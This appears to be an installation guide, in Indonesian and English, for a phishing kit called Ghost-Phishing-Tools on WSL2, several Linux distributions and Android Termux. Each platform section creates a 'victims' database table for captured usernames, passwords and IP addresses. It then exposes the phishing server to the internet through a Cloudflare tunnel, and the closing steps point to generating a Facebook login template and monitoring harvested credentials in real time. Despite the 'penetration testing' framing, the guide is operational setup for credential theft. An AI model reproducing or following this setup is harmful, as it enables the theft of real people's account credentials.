# 📥 Panduan Instalasi Detail - Ghost-Phishing-Tools

**Versi**: 2.0  
**Last Updated**: Maret 2024  
**Kompatibilitas**: Windows (WSL2), Linux, Termux

---

## Daftar Isi

1. [Windows - WSL2](#windows---wsl2)
2. [Linux - Distribusi Berbeda](#linux---distribusi-berbeda)
3. [Termux - Android](#termux---android)
4. [Verifikasi Instalasi](#verifikasi-instalasi)
5. [Troubleshooting](#troubleshooting)

---

## Windows - WSL2

Windows Subsystem for Linux 2 adalah metode terbaik menjalankan Ghost-Phishing-Tools di Windows.

### Prerequisites Check

```powershell
# Buka PowerShell sebagai Administrator (RunAs)
# Verifikasi Windows version
[Environment]::OSVersion.Version
# Minimal: Windows 10 Build 19041 atau Windows 11
```

### Phase 1: Install WSL2

```powershell
# Step 1: Enable Virtual Machine Platform
dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart

# Step 2: Enable WSL Feature
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart

# Step 3: Set Default WSL Version
wsl --set-default-version 2

# Step 4: Install Ubuntu 22.04 LTS
wsl --install -d Ubuntu-22.04

# Step 5: Restart Computer (CRITICAL!)
Restart-Computer
```

**Post-Restart**: WSL akan launch otomatis. Set username & password untuk Linux.

### Phase 2: Environment Setup

```bash
# Masuk ke WSL
wsl -d Ubuntu-22.04

# Update system packages
sudo apt update && sudo apt upgrade -y
sudo apt install -y curl wget git

# Verify bash version
bash --version  # Minimal 4.0
```

### Phase 3: Install Dependencies

```bash
# Install PHP Stack
sudo apt install -y \
  php \
  php-cli \
  php-mysql \
  php-curl \
  php-json \
  php-xml

# Install MySQL Server
sudo apt install -y mysql-server

# Install additional tools
sudo apt install -y \
  build-essential \
  sudo \
  openssh-client
```

### Phase 4: Start and Configure MySQL

```bash
# Start MySQL service
sudo service mysql start

# Verify MySQL is running
sudo service mysql status

# Secure MySQL installation (optional but recommended)
sudo mysql_secure_installation

# Create database and user
sudo mysql -u root -p << 'EOF'
CREATE DATABASE ghost_audit;
CREATE USER 'root'@'localhost' IDENTIFIED BY '';
GRANT ALL PRIVILEGES ON ghost_audit.* TO 'root'@'localhost';

CREATE TABLE ghost_audit.victims (
  id INT AUTO_INCREMENT PRIMARY KEY,
  platform VARCHAR(50),
  ip_address VARCHAR(45),
  username VARCHAR(255),
  password VARCHAR(255),
  user_agent TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

FLUSH PRIVILEGES;
EXIT;
EOF
```

### Phase 5: Install Cloudflare Tunnel

```bash
# Download latest cloudflared
cd /tmp
wget https://github.com/cloudflare/cloudflared/releases/download/2024.1.0/cloudflared-linux-amd64.deb

# Install package
sudo apt install -y ./cloudflared-linux-amd64.deb

# Cleanup
rm cloudflared-linux-amd64.deb

# Verify installation
cloudflared --version
```

### Phase 6: Clone Repository

```bash
# Navigate to home directory
cd ~

# Clone Ghost-Phishing-Tools
git clone https://github.com/Sneijderlino/Ghost-Phishing-Tools.git

# Change directory
cd Ghost-Phishing-Tools

# Make script executable
chmod +x Ghost-Phishing-Tools.sh

# Verify structure
ls -la
# Expected output:
# Ghost-Phishing-Tools.sh
# README.md
# INSTALLATION.md
# img/
# web_files/
```

### Phase 7: First Run (Test)

```bash
# Launch with sudo
sudo ./Ghost-Phishing-Tools.sh

# You should see the banner and main menu
# If successful, you're ready to use the tool!
```

### Making MySQL Autostart (Optional)

```bash
# Edit WSL config to autostart MySQL
sudo nano /etc/wsl.conf

# Add these lines:
[boot]
command=/etc/init.d/mysql start

# Save: Ctrl+X, Y, Enter
# Restart WSL for changes to take effect
exit
wsl -t Ubuntu-22.04
wsl -d Ubuntu-22.04
```

---

## Linux - Distribusi Berbeda

### Debian/Ubuntu (Recommended)

```bash
# Step 1: Update System
sudo apt update && sudo apt upgrade -y

# Step 2: Install Full Stack
sudo apt install -y \
  git curl wget \
  php php-cli php-mysql \
  mysql-server \
  build-essential sudo

# Step 3: Start Services
sudo systemctl start mysql
sudo systemctl enable mysql  # Auto-start on boot

# Step 4: Setup Database
sudo mysql -u root << 'EOF'
CREATE DATABASE ghost_audit;
CREATE USER 'root'@'localhost' IDENTIFIED BY '';
GRANT ALL PRIVILEGES ON ghost_audit.* TO 'root'@'localhost';

CREATE TABLE ghost_audit.victims (
  id INT AUTO_INCREMENT PRIMARY KEY,
  platform VARCHAR(50),
  ip_address VARCHAR(45),
  username VARCHAR(255),
  password VARCHAR(255),
  user_agent TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

FLUSH PRIVILEGES;
EXIT;
EOF

# Step 5: Download & Install Cloudflared
wget https://github.com/cloudflare/cloudflared/releases/download/2024.1.0/cloudflared-linux-amd64.deb
sudo apt install -y ./cloudflared-linux-amd64.deb
rm cloudflared-linux-amd64.deb

# Step 6: Clone Repository
cd ~
git clone https://github.com/Sneijderlino/Ghost-Phishing-Tools.git
cd Ghost-Phishing-Tools
chmod +x Ghost-Phishing-Tools.sh

# Step 7: Run
sudo ./Ghost-Phishing-Tools.sh
```

### CentOS / RHEL 8+

```bash
# Step 1: Update System
sudo yum update -y

# Step 2: Install Stack
sudo yum install -y \
  git curl wget \
  php php-mysqlnd \
  mysql-server \
  gcc make sudo

# Step 3: Start MySQL
sudo systemctl start mysqld
sudo systemctl enable mysqld

# Step 4: Setup Database
sudo mysql -u root << 'EOF'
CREATE DATABASE ghost_audit;
CREATE USER 'root'@'localhost' IDENTIFIED BY '';
GRANT ALL PRIVILEGES ON ghost_audit.* TO 'root'@'localhost';

CREATE TABLE ghost_audit.victims (
  id INT AUTO_INCREMENT PRIMARY KEY,
  platform VARCHAR(50),
  ip_address VARCHAR(45),
  username VARCHAR(255),
  password VARCHAR(255),
  user_agent TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

FLUSH PRIVILEGES;
EXIT;
EOF

# Step 5: Cloudflared (CentOS doesn't have .deb, use binary)
wget https://github.com/cloudflare/cloudflared/releases/download/2024.1.0/cloudflared-linux-amd64
chmod +x cloudflared-linux-amd64
sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared

# Step 6: Clone & Run
cd ~
git clone https://github.com/Sneijderlino/Ghost-Phishing-Tools.git
cd Ghost-Phishing-Tools
chmod +x Ghost-Phishing-Tools.sh
sudo ./Ghost-Phishing-Tools.sh
```

### Arch Linux / Manjaro

```bash
# Step 1: Update
sudo pacman -Syu

# Step 2: Install Dependencies
sudo pacman -S \
  git curl wget \
  php \
  mysql \
  gcc make sudo

# Step 3: Start MySQL
sudo systemctl start mysqld
sudo systemctl enable mysqld

# Step 4: Setup Database (same as above)
sudo mysql -u root << 'EOF'
CREATE DATABASE ghost_audit;
CREATE USER 'root'@'localhost' IDENTIFIED BY '';
GRANT ALL PRIVILEGES ON ghost_audit.* TO 'root'@'localhost';

CREATE TABLE ghost_audit.victims (
  id INT AUTO_INCREMENT PRIMARY KEY,
  platform VARCHAR(50),
  ip_address VARCHAR(45),
  username VARCHAR(255),
  password VARCHAR(255),
  user_agent TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

FLUSH PRIVILEGES;
EOF

# Step 5: Install Cloudflared from AUR
yay -S cloudflare-warp  # or use git + make

# Step 6: Clone & Run
cd ~
git clone https://github.com/Sneijderlino/Ghost-Phishing-Tools.git
cd Ghost-Phishing-Tools
chmod +x Ghost-Phishing-Tools.sh
sudo ./Ghost-Phishing-Tools.sh
```

---

## Termux - Android

Termux memberikan environment Linux penuh di Android. Ini adalah metode paling powerful untuk mobile penetration testing.

### Prerequisites

- Android 5.0 atau lebih tinggi
- Termux dari F-Droid (BUKAN Play Store)
- Min 300MB storage
- Koneksi WiFi stabil

### Installation Steps

#### Step 1: Install Termux

```
1. Visit https://f-droid.org/en/packages/com.termux/
2. Download Termux APK
3. Install application
4. Open Termux (first launch akan download bootstrap)
5. Wait until setup complete (~5 minutes)
```

#### Step 2: Update Repository & Permission

```bash
# Grant storage access
termux-setup-storage
# Accept permission popup

# Update packages
pkg update && pkg upgrade -y

# Install essential tools
pkg install -y git curl wget openssh
```

#### Step 3: Install PHP & MySQL

```bash
# Install PHP (lightweight version)
pkg install -y php php-mysql

# Verify PHP
php -v
# Expected: PHP 8.x.x or higher

# Install MariaDB (MySQL compatible)
pkg install -y mariadb

# Verify MariaDB
mariadb --version
```

#### Step 4: Initialize MySQL Database

```bash
# Initialize MySQL data directory
mysql_install_db

# Start MySQL server
mariadbd &

# Wait 2-3 seconds for startup
sleep 3

# Create database and tables
mysql -u root << 'EOF'
CREATE DATABASE ghost_audit;
CREATE TABLE ghost_audit.victims (
  id INT AUTO_INCREMENT PRIMARY KEY,
  platform VARCHAR(50),
  ip_address VARCHAR(45),
  username VARCHAR(255),
  password VARCHAR(255),
  user_agent TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
EOF

# Verify database
mysql -u root -e "SHOW DATABASES;"
```

#### Step 5: Install Cloudflare Tunnel (ARM64 Binary)

```bash
# Download ARM64 version
cd $HOME
wget https://github.com/cloudflare/cloudflared/releases/download/2024.1.0/cloudflared-linux-arm64

# Make executable
chmod +x cloudflared-linux-arm64

# Move to PATH
mv cloudflared-linux-arm64 $PREFIX/bin/cloudflared

# Verify
cloudflared --version
```

#### Step 6: Clone Repository

```bash
# Navigate to home
cd $HOME

# Clone repo
git clone https://github.com/Sneijderlino/Ghost-Phishing-Tools.git

# Enter directory
cd Ghost-Phishing-Tools

# Make executable
chmod +x Ghost-Phishing-Tools.sh

# List files
ls -la
```

#### Step 7: Prepare Environment Scripts (Termux-specific)

Create a wrapper script for easier launching:

```bash
cat > run_ghost.sh << 'EOF'
#!/bin/bash

# Start MySQL if not running
if ! pgrep -x "mariadbd" > /dev/null; then
    echo "[*] Starting MariaDB..."
    mariadbd &
    sleep 3
fi

# Run Ghost Tool
./Ghost-Phishing-Tools.sh
EOF

chmod +x run_ghost.sh
```

#### Step 8: First Run

```bash
# Option A: Direct run
./Ghost-Phishing-Tools.sh

# Option B: Using wrapper (recommended)
./run_ghost.sh
```

### Termux-Specific Tips

#### Keep-Alive (Prevent Auto-Kill)

```bash
# Disable power optimization for Termux
# Settings > Apps > App management > Termux > Battery > Unrestricted
# OR use a keep-alive app like "Caffeine"
```

#### Running in Background

```bash
# Use nohup to keep running even if Termux closes
nohup ./run_ghost.sh > ghost.log 2>&1 &

# Check logs
tail -f ghost.log
```

#### Multi-Session (Run multiple tools)

```bash
# Open second session
# Ctrl+Volume Down+N (or use Termux Widget)

# In second session:
tail -f database_audit.txt  # Monitor logs in real-time
```

#### SSH Access (Remote Control)

```bash
# Start SSH server in Termux
sshd

# From other device:
ssh user@<termux-ip>
```

---

## Verifikasi Instalasi

Jalankan checklist ini untuk memastikan instalasi berhasil:

```bash
#!/bin/bash
echo "=== Ghost-Phishing-Tools Installation Verification ==="

# Check Bash
echo "[1] Checking Bash..."
bash --version | head -n 1
echo "✓ Passed"

# Check PHP
echo "[2] Checking PHP..."
php --version | head -n 1
echo "✓ Passed"

# Check MySQL
echo "[3] Checking MySQL..."
mysql --version
echo "✓ Passed"

# Check Cloudflare Tunnel
echo "[4] Checking Cloudflared..."
cloudflared --version
echo "✓ Passed"

# Check Database
echo "[5] Checking Database..."
mysql -u root -e "USE ghost_audit; SHOW TABLES;" 2>/dev/null && echo "✓ Passed" || echo "✗ Failed"

# Check Script
echo "[6] Checking Ghost Script..."
[[ -f "Ghost-Phishing-Tools.sh" && -x "Ghost-Phishing-Tools.sh" ]] && echo "✓ Passed" || echo "✗ Failed"

echo ""
echo "=== Installation Verification Complete ==="
```

Save this as `verify.sh` and run:

```bash
chmod +x verify.sh
./verify.sh
```

---

## Troubleshooting

### 🔴 Error: "bash: ./Ghost-Phishing-Tools.sh: /bin/bash^M: bad interpreter"

**Cause**: File has Windows line endings (CRLF)  
**Fix**:

```bash
dos2unix Ghost-Phishing-Tools.sh
# or
sed -i 's/\r$//' Ghost-Phishing-Tools.sh
```

### 🔴 Error: "mysql: command not found"

**Cause**: MySQL/MariaDB not installed or not in PATH  
**Fix (Debian/Ubuntu)**:

```bash
sudo apt install -y mysql-client-core-8.0
```

**Fix (Termux)**:

```bash
pkg install -y mariadb
```

### 🔴 Error: "cloudflared: command not found"

**Cause**: Cloudflared not installed  
**Fix**:

```bash
# Linux
wget https://github.com/cloudflare/cloudflared/releases/download/2024.1.0/cloudflared-linux-amd64.deb
sudo apt install ./cloudflared-linux-amd64.deb

# Termux
wget https://github.com/cloudflare/cloudflared/releases/download/2024.1.0/cloudflared-linux-arm64
mv cloudflared-linux-arm64 $PREFIX/bin/cloudflared
chmod +x $PREFIX/bin/cloudflared
```

### 🔴 Error: "ERROR 1045 (28000): Access denied for user 'root'@'localhost'"

**Cause**: MySQL credential mismatch  
**Fix**:

```bash
# Reset MySQL root password
sudo mysql -u root
ALTER USER 'root'@'localhost' IDENTIFIED BY '';
FLUSH PRIVILEGES;
EXIT;
```

### 🔴 Error: "Port 8888 already in use"

**Cause**: Another process using the port  
**Fix**:

```bash
# Find process
sudo lsof -i :8888

# Kill process
sudo kill -9 <PID>

# Or change port in script
sed -i 's/8888/9999/' Ghost-Phishing-Tools.sh
```

### 🔴 WSL2: "Hyper-V not enabled"

**Cause**: Virtualization disabled in BIOS  
**Fix**:

1. Restart computer and enter BIOS
2. Find "Virtualization Technology" or "Intel VT" setting
3. Enable it
4. Save and restart

### 🔴 Termux: "Cloudflare tunnel timeout"

**Cause**: Unstable internet connection  
**Fix**:

```bash
# Use different DNS
echo "nameserver 1.1.1.1" > /etc/resolv.conf

# Try connecting again
cloudflared tunnel --url http://localhost:8888
```

---

## Next Steps

After successful installation:

1. **Read README.md** - Understand tool features
2. **Test Setup** - Run option 1 to create Facebook template
3. **Review Output** - Check generated files in `web_files/`
4. **Run Server** - Execute option 3 to test tunnel connection
5. **Monitor** - Watch real-time logs (use test credentials only)

---

## Support

Jika mengalami masalah:

1. **Check Logs**:

   ```bash
   cat database_audit.txt
   tail -f .tunnel.log
   ```

2. **GitHub Issues**: https://github.com/Sneijderlino/Ghost-Phishing-Tools/issues

3. **Community**: Check discussions & wiki for common solutions

---

**Last Update**: Maret 2024  
**Compatibility**: Windows WSL2, Linux, Termux  
**Status**: ✅ Production Ready
